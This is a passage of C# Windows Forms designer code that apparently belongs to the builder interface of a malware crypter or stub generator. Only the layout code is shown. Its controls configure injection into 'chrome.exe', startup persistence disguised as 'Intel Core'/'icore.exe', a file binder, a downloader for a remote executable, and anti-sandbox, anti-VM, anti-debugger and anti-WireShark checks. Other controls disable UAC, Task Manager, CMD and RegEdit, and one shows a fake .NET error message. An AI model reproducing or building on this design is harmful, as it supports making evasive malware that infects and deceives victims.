            this.vbc.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.vbc.Checked = false;
            this.vbc.CheckStyle = InstaCheckBox.CheckStyleType.Round;
            this.vbc.Font = new System.Drawing.Font("Verdana", 7F);
            this.vbc.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.vbc.Location = new System.Drawing.Point(202, 147);
            this.vbc.Name = "vbc";
            this.vbc.Size = new System.Drawing.Size(48, 23);
            this.vbc.TabIndex = 17;
            this.vbc.Text = "vbc";
            this.vbc.Click += new System.EventHandler(this.vbc_Click);
            // 
            // txtInj
            // 
            this.txtInj.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.txtInj.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtInj.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.txtInj.Location = new System.Drawing.Point(92, 146);
            this.txtInj.Name = "txtInj";
            this.txtInj.Size = new System.Drawing.Size(100, 19);
            this.txtInj.TabIndex = 16;
            this.txtInj.Text = "chrome.exe";
            // 
            // txtSUPfile
            // 
            this.txtSUPfile.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.txtSUPfile.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtSUPfile.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.txtSUPfile.Location = new System.Drawing.Point(92, 91);
            this.txtSUPfile.Name = "txtSUPfile";
            this.txtSUPfile.Size = new System.Drawing.Size(100, 19);
            this.txtSUPfile.TabIndex = 12;
            this.txtSUPfile.Text = "icore.exe";
            // 
            // txtSUPvalue
            // 
            this.txtSUPvalue.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.txtSUPvalue.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtSUPvalue.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.txtSUPvalue.Location = new System.Drawing.Point(92, 66);
            this.txtSUPvalue.Name = "txtSUPvalue";
            this.txtSUPvalue.Size = new System.Drawing.Size(100, 19);
            this.txtSUPvalue.TabIndex = 11;
            this.txtSUPvalue.Text = "Intel Core";
            // 
            // instaLabel5
            // 
            this.instaLabel5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel5.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel5.Location = new System.Drawing.Point(29, 92);
            this.instaLabel5.Name = "instaLabel5";
            this.instaLabel5.Size = new System.Drawing.Size(48, 19);
            this.instaLabel5.TabIndex = 10;
            this.instaLabel5.Text = "File";
            // 
            // instaLabel4
            // 
            this.instaLabel4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel4.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel4.Location = new System.Drawing.Point(29, 69);
            this.instaLabel4.Name = "instaLabel4";
            this.instaLabel4.Size = new System.Drawing.Size(48, 19);
            this.instaLabel4.TabIndex = 9;
            this.instaLabel4.Text = "Value";
            // 
            // instaSeperator1
            // 
            this.instaSeperator1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator1.IsVertical = false;
            this.instaSeperator1.Location = new System.Drawing.Point(6, 37);
            this.instaSeperator1.Name = "instaSeperator1";
            this.instaSeperator1.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator1.TabIndex = 7;
            this.instaSeperator1.Text = "instaSeperator1";
            this.instaSeperator1.Thickness = 1F;
            // 
            // lblFile
            // 
            this.lblFile.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.lblFile.Font = new System.Drawing.Font("Verdana", 7F);
            this.lblFile.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.lblFile.Location = new System.Drawing.Point(6, 9);
            this.lblFile.Name = "lblFile";
            this.lblFile.Size = new System.Drawing.Size(134, 19);
            this.lblFile.TabIndex = 6;
            // 
            // instaButton2
            // 
            this.instaButton2.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton2.Location = new System.Drawing.Point(178, 6);
            this.instaButton2.Name = "instaButton2";
            this.instaButton2.Size = new System.Drawing.Size(100, 25);
            this.instaButton2.TabIndex = 6;
            this.instaButton2.Text = "Browse";
            this.instaButton2.Click += new System.EventHandler(this.instaButton2_Click);
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage2.Controls.Add(this.boxBindOnce);
            this.tabPage2.Controls.Add(this.binderClear);
            this.tabPage2.Controls.Add(this.binderRemove);
            this.tabPage2.Controls.Add(this.binderAdd);
            this.tabPage2.Controls.Add(this.listBind);
            this.tabPage2.Location = new System.Drawing.Point(156, 4);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(284, 215);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Binder";
            // 
            // boxBindOnce
            // 
            this.boxBindOnce.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boxBindOnce.Checked = false;
            this.boxBindOnce.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.boxBindOnce.Font = new System.Drawing.Font("Verdana", 7F);
            this.boxBindOnce.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boxBindOnce.Location = new System.Drawing.Point(198, 189);
            this.boxBindOnce.Name = "boxBindOnce";
            this.boxBindOnce.Size = new System.Drawing.Size(78, 21);
            this.boxBindOnce.TabIndex = 29;
            this.boxBindOnce.Text = "Run Once";
            // 
            // binderClear
            // 
            this.binderClear.Font = new System.Drawing.Font("Verdana", 7F);
            this.binderClear.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.binderClear.Location = new System.Drawing.Point(134, 184);
            this.binderClear.Name = "binderClear";
            this.binderClear.Size = new System.Drawing.Size(58, 25);
            this.binderClear.TabIndex = 28;
            this.binderClear.Text = "Clear";
            this.binderClear.Click += new System.EventHandler(this.binderClear_Click);
            // 
            // binderRemove
            // 
            this.binderRemove.Font = new System.Drawing.Font("Verdana", 7F);
            this.binderRemove.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.binderRemove.Location = new System.Drawing.Point(70, 184);
            this.binderRemove.Name = "binderRemove";
            this.binderRemove.Size = new System.Drawing.Size(58, 25);
            this.binderRemove.TabIndex = 27;
            this.binderRemove.Text = "Remove";
            this.binderRemove.Click += new System.EventHandler(this.binderRemove_Click);
            // 
            // binderAdd
            // 
            this.binderAdd.Font = new System.Drawing.Font("Verdana", 7F);
            this.binderAdd.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.binderAdd.Location = new System.Drawing.Point(6, 184);
            this.binderAdd.Name = "binderAdd";
            this.binderAdd.Size = new System.Drawing.Size(58, 25);
            this.binderAdd.TabIndex = 26;
            this.binderAdd.Text = "Add";
            this.binderAdd.Click += new System.EventHandler(this.binderAdd_Click);
            // 
            // listBind
            // 
            this.listBind.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listBind.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listBind.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.listBind.FormattingEnabled = true;
            this.listBind.ItemHeight = 12;
            this.listBind.Location = new System.Drawing.Point(6, 6);
            this.listBind.Name = "listBind";
            this.listBind.Size = new System.Drawing.Size(272, 168);
            this.listBind.TabIndex = 0;
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage3.Controls.Add(this.instaButton4);
            this.tabPage3.Controls.Add(this.instaButton5);
            this.tabPage3.Controls.Add(this.instaButton6);
            this.tabPage3.Controls.Add(this.txtdl);
            this.tabPage3.Controls.Add(this.boxDLOnce);
            this.tabPage3.Controls.Add(this.listDL);
            this.tabPage3.Location = new System.Drawing.Point(156, 4);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage3.Size = new System.Drawing.Size(284, 215);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Downloader";
            // 
            // instaButton4
            // 
            this.instaButton4.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton4.Location = new System.Drawing.Point(134, 184);
            this.instaButton4.Name = "instaButton4";
            this.instaButton4.Size = new System.Drawing.Size(58, 25);
            this.instaButton4.TabIndex = 35;
            this.instaButton4.Text = "Clear";
            this.instaButton4.Click += new System.EventHandler(this.instaButton4_Click);
            // 
            // instaButton5
            // 
            this.instaButton5.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton5.Location = new System.Drawing.Point(70, 184);
            this.instaButton5.Name = "instaButton5";
            this.instaButton5.Size = new System.Drawing.Size(58, 25);
            this.instaButton5.TabIndex = 34;
            this.instaButton5.Text = "Remove";
            this.instaButton5.Click += new System.EventHandler(this.instaButton5_Click);
            // 
            // instaButton6
            // 
            this.instaButton6.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton6.Location = new System.Drawing.Point(6, 184);
            this.instaButton6.Name = "instaButton6";
            this.instaButton6.Size = new System.Drawing.Size(58, 25);
            this.instaButton6.TabIndex = 33;
            this.instaButton6.Text = "Add";
            this.instaButton6.Click += new System.EventHandler(this.instaButton6_Click);
            // 
            // txtdl
            // 
            this.txtdl.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.txtdl.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtdl.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.txtdl.Location = new System.Drawing.Point(6, 158);
            this.txtdl.Name = "txtdl";
            this.txtdl.Size = new System.Drawing.Size(270, 19);
            this.txtdl.TabIndex = 32;
            this.txtdl.Text = "http://www.yourwebsite.com/file.exe";
            // 
            // boxDLOnce
            // 
            this.boxDLOnce.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boxDLOnce.Checked = false;
            this.boxDLOnce.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.boxDLOnce.Font = new System.Drawing.Font("Verdana", 7F);
            this.boxDLOnce.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boxDLOnce.Location = new System.Drawing.Point(198, 189);
            this.boxDLOnce.Name = "boxDLOnce";
            this.boxDLOnce.Size = new System.Drawing.Size(78, 21);
            this.boxDLOnce.TabIndex = 31;
            this.boxDLOnce.Text = "Run Once";
            this.boxDLOnce.Click += new System.EventHandler(this.boxDLOnce_Click);
            // 
            // listDL
            // 
            this.listDL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.listDL.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listDL.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.listDL.FormattingEnabled = true;
            this.listDL.ItemHeight = 12;
            this.listDL.Location = new System.Drawing.Point(6, 6);
            this.listDL.Name = "listDL";
            this.listDL.Size = new System.Drawing.Size(272, 144);
            this.listDL.TabIndex = 30;
            // 
            // tabPage5
            // 
            this.tabPage5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage5.Controls.Add(this.a3);
            this.tabPage5.Controls.Add(this.instaLabel10);
            this.tabPage5.Controls.Add(this.d4);
            this.tabPage5.Controls.Add(this.d3);
            this.tabPage5.Controls.Add(this.d2);
            this.tabPage5.Controls.Add(this.d1);
            this.tabPage5.Controls.Add(this.instaLabel9);
            this.tabPage5.Controls.Add(this.instaSeperator5);
            this.tabPage5.Controls.Add(this.a2);
            this.tabPage5.Controls.Add(this.a4);
            this.tabPage5.Controls.Add(this.a5);
            this.tabPage5.Controls.Add(this.a1);
            this.tabPage5.Controls.Add(this.instaLabel7);
            this.tabPage5.Controls.Add(this.instaSeperator4);
            this.tabPage5.Location = new System.Drawing.Point(156, 4);
            this.tabPage5.Name = "tabPage5";
            this.tabPage5.Size = new System.Drawing.Size(284, 215);
            this.tabPage5.TabIndex = 4;
            this.tabPage5.Text = "Antis / Disable";
            // 
            // a3
            // 
            this.a3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.a3.Checked = false;
            this.a3.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.a3.Font = new System.Drawing.Font("Verdana", 7F);
            this.a3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.a3.Location = new System.Drawing.Point(200, 34);
            this.a3.Name = "a3";
            this.a3.Size = new System.Drawing.Size(78, 23);
            this.a3.TabIndex = 35;
            this.a3.Text = "Debugger";
            // 
            // instaLabel10
            // 
            this.instaLabel10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel10.Font = new System.Drawing.Font("Verdana", 6F);
            this.instaLabel10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel10.Location = new System.Drawing.Point(99, 193);
            this.instaLabel10.Name = "instaLabel10";
            this.instaLabel10.Size = new System.Drawing.Size(180, 19);
            this.instaLabel10.TabIndex = 34;
            this.instaLabel10.Text = "Disablers may require Admin rights.";
            // 
            // d4
            // 
            this.d4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.d4.Checked = false;
            this.d4.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.d4.Font = new System.Drawing.Font("Verdana", 7F);
            this.d4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.d4.Location = new System.Drawing.Point(101, 125);
            this.d4.Name = "d4";
            this.d4.Size = new System.Drawing.Size(78, 23);
            this.d4.TabIndex = 33;
            this.d4.Text = "RegEdit";
            // 
            // d3
            // 
            this.d3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.d3.Checked = false;
            this.d3.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.d3.Font = new System.Drawing.Font("Verdana", 7F);
            this.d3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.d3.Location = new System.Drawing.Point(6, 189);
            this.d3.Name = "d3";
            this.d3.Size = new System.Drawing.Size(78, 23);
            this.d3.TabIndex = 32;
            this.d3.Text = "CMD";
            // 
            // d2
            // 
            this.d2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.d2.Checked = false;
            this.d2.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.d2.Font = new System.Drawing.Font("Verdana", 7F);
            this.d2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.d2.Location = new System.Drawing.Point(6, 155);
            this.d2.Name = "d2";
            this.d2.Size = new System.Drawing.Size(89, 23);
            this.d2.TabIndex = 31;
            this.d2.Text = "Task Manager";
            // 
            // d1
            // 
            this.d1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.d1.Checked = false;
            this.d1.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.d1.Font = new System.Drawing.Font("Verdana", 7F);
            this.d1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.d1.Location = new System.Drawing.Point(6, 126);
            this.d1.Name = "d1";
            this.d1.Size = new System.Drawing.Size(78, 23);
            this.d1.TabIndex = 30;
            this.d1.Text = "UAC";
            // 
            // instaLabel9
            // 
            this.instaLabel9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel9.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel9.Location = new System.Drawing.Point(6, 100);
            this.instaLabel9.Name = "instaLabel9";
            this.instaLabel9.Size = new System.Drawing.Size(134, 19);
            this.instaLabel9.TabIndex = 29;
            this.instaLabel9.Text = "Disable";
            // 
            // instaSeperator5
            // 
            this.instaSeperator5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator5.IsVertical = false;
            this.instaSeperator5.Location = new System.Drawing.Point(6, 96);
            this.instaSeperator5.Name = "instaSeperator5";
            this.instaSeperator5.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator5.TabIndex = 28;
            this.instaSeperator5.Text = "instaSeperator5";
            this.instaSeperator5.Thickness = 1F;
            // 
            // a2
            // 
            this.a2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.a2.Checked = false;
            this.a2.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.a2.Font = new System.Drawing.Font("Verdana", 7F);
            this.a2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.a2.Location = new System.Drawing.Point(101, 34);
            this.a2.Name = "a2";
            this.a2.Size = new System.Drawing.Size(106, 23);
            this.a2.TabIndex = 27;
            this.a2.Text = "Virtual Machine";
            // 
            // a4
            // 
            this.a4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.a4.Checked = false;
            this.a4.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.a4.Font = new System.Drawing.Font("Verdana", 7F);
            this.a4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.a4.Location = new System.Drawing.Point(101, 63);
            this.a4.Name = "a4";
            this.a4.Size = new System.Drawing.Size(78, 23);
            this.a4.TabIndex = 26;
            this.a4.Text = "WireShark";
            // 
            // a5
            // 
            this.a5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.a5.Checked = false;
            this.a5.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.a5.Font = new System.Drawing.Font("Verdana", 7F);
            this.a5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.a5.Location = new System.Drawing.Point(6, 63);
            this.a5.Name = "a5";
            this.a5.Size = new System.Drawing.Size(78, 23);
            this.a5.TabIndex = 25;
            this.a5.Text = "Emulator";
            // 
            // a1
            // 
            this.a1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.a1.Checked = false;
            this.a1.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.a1.Font = new System.Drawing.Font("Verdana", 7F);
            this.a1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.a1.Location = new System.Drawing.Point(6, 34);
            this.a1.Name = "a1";
            this.a1.Size = new System.Drawing.Size(78, 23);
            this.a1.TabIndex = 24;
            this.a1.Text = "Sandboxie";
            // 
            // instaLabel7
            // 
            this.instaLabel7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel7.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel7.Location = new System.Drawing.Point(6, 9);
            this.instaLabel7.Name = "instaLabel7";
            this.instaLabel7.Size = new System.Drawing.Size(134, 19);
            this.instaLabel7.TabIndex = 10;
            this.instaLabel7.Text = "Anti";
            // 
            // instaSeperator4
            // 
            this.instaSeperator4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaSeperator4.IsVertical = false;
            this.instaSeperator4.Location = new System.Drawing.Point(6, 5);
            this.instaSeperator4.Name = "instaSeperator4";
            this.instaSeperator4.Size = new System.Drawing.Size(272, 23);
            this.instaSeperator4.TabIndex = 9;
            this.instaSeperator4.Text = "instaSeperator4";
            this.instaSeperator4.Thickness = 1F;
            // 
            // tabPage7
            // 
            this.tabPage7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(212)))), ((int)(((byte)(212)))), ((int)(((byte)(212)))));
            this.tabPage7.Controls.Add(this.instaLabel11);
            this.tabPage7.Controls.Add(this.boolMsg);
            this.tabPage7.Controls.Add(this.msgRunOnce);
            this.tabPage7.Controls.Add(this.instaButton7);
            this.tabPage7.Controls.Add(this.msgBody);
            this.tabPage7.Controls.Add(this.instaLabel13);
            this.tabPage7.Controls.Add(this.msgTitle);
            this.tabPage7.Controls.Add(this.instaLabel12);
            this.tabPage7.Controls.Add(this.instaSeperator6);
            this.tabPage7.Location = new System.Drawing.Point(156, 4);
            this.tabPage7.Name = "tabPage7";
            this.tabPage7.Size = new System.Drawing.Size(284, 215);
            this.tabPage7.TabIndex = 6;
            this.tabPage7.Text = "Fake Message";
            // 
            // instaLabel11
            // 
            this.instaLabel11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel11.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel11.Location = new System.Drawing.Point(27, 7);
            this.instaLabel11.Name = "instaLabel11";
            this.instaLabel11.Size = new System.Drawing.Size(134, 19);
            this.instaLabel11.TabIndex = 31;
            this.instaLabel11.Text = "Fake Message";
            // 
            // boolMsg
            // 
            this.boolMsg.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.boolMsg.Checked = false;
            this.boolMsg.CheckStyle = InstaCheckBox.CheckStyleType.Checkmark;
            this.boolMsg.Font = new System.Drawing.Font("Verdana", 7F);
            this.boolMsg.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.boolMsg.Location = new System.Drawing.Point(8, 6);
            this.boolMsg.Name = "boolMsg";
            this.boolMsg.Size = new System.Drawing.Size(78, 21);
            this.boolMsg.TabIndex = 35;
            // 
            // msgRunOnce
            // 
            this.msgRunOnce.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.msgRunOnce.Checked = false;
            this.msgRunOnce.CheckStyle = InstaCheckBox.CheckStyleType.Square;
            this.msgRunOnce.Font = new System.Drawing.Font("Verdana", 7F);
            this.msgRunOnce.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.msgRunOnce.Location = new System.Drawing.Point(200, 185);
            this.msgRunOnce.Name = "msgRunOnce";
            this.msgRunOnce.Size = new System.Drawing.Size(78, 21);
            this.msgRunOnce.TabIndex = 34;
            this.msgRunOnce.Text = "Run Once";
            // 
            // instaButton7
            // 
            this.instaButton7.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaButton7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.instaButton7.Location = new System.Drawing.Point(96, 179);
            this.instaButton7.Name = "instaButton7";
            this.instaButton7.Size = new System.Drawing.Size(93, 25);
            this.instaButton7.TabIndex = 26;
            this.instaButton7.Text = "Test";
            this.instaButton7.Click += new System.EventHandler(this.instaButton7_Click);
            // 
            // msgBody
            // 
            this.msgBody.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.msgBody.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.msgBody.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.msgBody.Location = new System.Drawing.Point(17, 83);
            this.msgBody.Multiline = true;
            this.msgBody.Name = "msgBody";
            this.msgBody.Size = new System.Drawing.Size(246, 90);
            this.msgBody.TabIndex = 14;
            this.msgBody.Text = "Microsoft .net Framework Error.";
            // 
            // instaLabel13
            // 
            this.instaLabel13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel13.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel13.Location = new System.Drawing.Point(17, 68);
            this.instaLabel13.Name = "instaLabel13";
            this.instaLabel13.Size = new System.Drawing.Size(134, 19);
            this.instaLabel13.TabIndex = 33;
            this.instaLabel13.Text = "Message";
            // 
            // msgTitle
            // 
            this.msgTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.msgTitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.msgTitle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(249)))), ((int)(((byte)(249)))));
            this.msgTitle.Location = new System.Drawing.Point(17, 44);
            this.msgTitle.Name = "msgTitle";
            this.msgTitle.Size = new System.Drawing.Size(238, 19);
            this.msgTitle.TabIndex = 13;
            this.msgTitle.Text = "Error!";
            // 
            // instaLabel12
            // 
            this.instaLabel12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.instaLabel12.Font = new System.Drawing.Font("Verdana", 7F);
            this.instaLabel12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(160)))), ((int)(((byte)(190)))));
            this.instaLabel12.Location = new System.Drawing.Point(17, 26);
            this.instaLabel12.Name = "instaLabel12";
            this.instaLabel12.Size = new System.Drawing.Size(134, 19);
            this.instaLabel12.TabIndex = 32;
            this.instaLabel12.Text = "Title";
            // 
            // instaSeperator6
            // 
